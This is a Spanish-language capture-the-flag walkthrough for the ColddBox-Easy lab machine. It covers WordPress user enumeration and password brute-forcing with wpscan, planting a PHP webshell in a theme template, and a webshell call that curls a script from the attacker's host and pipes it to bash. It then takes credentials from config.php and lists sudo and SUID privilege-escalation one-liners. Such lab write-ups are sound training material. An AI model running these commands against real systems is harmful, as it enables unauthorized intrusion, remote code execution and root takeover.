PORT   STATE SERVICE
80/tcp open  http

-Visitamos la web, se trata de un Wordpress version 4.1.31

-Iniciamos escaneo con wpscan enumerando plugins y usuarios:
	wpscan --url http://10.10.211.0 -e vp,u

-Encontramos los siguientes usuarios:
	[+] hugo
	[+] c0ldd
	[+] philip

-Iniciamos un ataque de fuerza bruta para romper la contraseña del usuario c0ldd:
	wpscan --url http://10.10.211.0 -U c0ldd -P /usr/share/wordlists/rockyou.txt
	password: 9876543210

-Nos logueamos en la ruta /wp-admin

-Como hemos entrado con el usuario admin tenemos permisos para hacer lo que sea en el wordpress

-Para obtener acceso a la máquina, una de las cosas que se pueden hacer es inyectar código malicioso dentro de un template. Para ello entramos en:
	appearance --> Editor

-Dentro del Editor seleccionamos cualquier archivo .php al que podamos ir desde la url y ejecutarlo. Por ejemplo, los archivos index.php, header.php y footer.php se ejecutan siempre que recargamos la página principal. 

-Tenemos dos opciones para inyectar código dentro de un template:

1-Pegar la reverse shell de PentestMonkey o Ivan Sincek. Guardar la configuración. Ponerse en escucha y ejecutar la página principal.

2-Pegar una webshell en php. Nos vamos a la página principal y a través del parámetro 'cmd' (o el que tengamos configurado) ejecutamos un comando en el servidor. No he conseguido la reverse shell directamente (supongo que se podrá de alguna manera). Lo que si se puede es hacer un curl desde la url a nuestro servidor para que lea una reverse shell. 
	
-Los comandos se ejecutan desde aquí:
	PÁGINA_PRINCIPAL_IP/?cmd=curl http://IP_DE_MI_MáQUINA/exploit.sh | /bin/bash

IMPORTANTE: Si el exploit está en bash, tenemos que poner '| /bin/bash' para que lo interprete, sino no lo ejecuta. También podemos poner '| bash'. Si el exploit está en php es así '| php'

## Escalada de privilegios

-Entramos a la máquina como el usuario www-data

-Vamos  a la ruta /var/www/html/config.php y encontramos credenciales para pivotar al usuario c0ldd:
	define('DB_USER', 'c0ldd');
	define('DB_PASSWORD', 'cybersecurity');

-Pivotamos al usuario c0ldd:
	su c0ldd
	password: cybersecurity

-Hacemos un sudo -l para ver que permisos tiene el usuario c0ldd:
	sudo -l
	El usuario c0ldd puede ejecutar los siguientes comandos en ColddBox-Easy:
    (root) /usr/bin/vim
    (root) /bin/chmod
    (root) /usr/bin/ftp

-4 maneras de escalar privilegios:
	1-vim --> sudo vim --> Cuando se abra hacemos CONTROL + c --> :!/bin/bash
	2-chmod --> sudo chmod +s /bin/bash --> bash -p
	3-ftp --> sudo ftp --> !/bin/sh
	4-Al final me di cuenta que se podía escalar directamente desde el usuario www-data con el binario /usr/bin/find en el que tenemos permisos SUID:
			/usr/bin/find . -exec /bin/sh -p \; -quit

